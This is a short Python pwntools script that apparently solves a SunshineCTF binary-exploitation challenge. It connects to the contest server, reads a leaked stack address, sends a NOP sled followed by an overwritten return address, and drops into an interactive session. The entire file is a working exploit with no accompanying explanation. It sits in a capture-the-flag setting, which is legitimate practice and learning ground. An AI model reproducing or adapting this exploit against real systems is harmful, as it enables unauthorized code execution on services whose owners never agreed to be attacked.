from pwn import*
p = remote('archive.sunshinectf.org', 19001 )
nop1 = asm(shellcraft.nop())
p.recvuntil(': ')
addr = p.recv()
addr = int(addr, 16)
p.sendline(nop1*0x16 + p32(addr-144))
p.interactive()
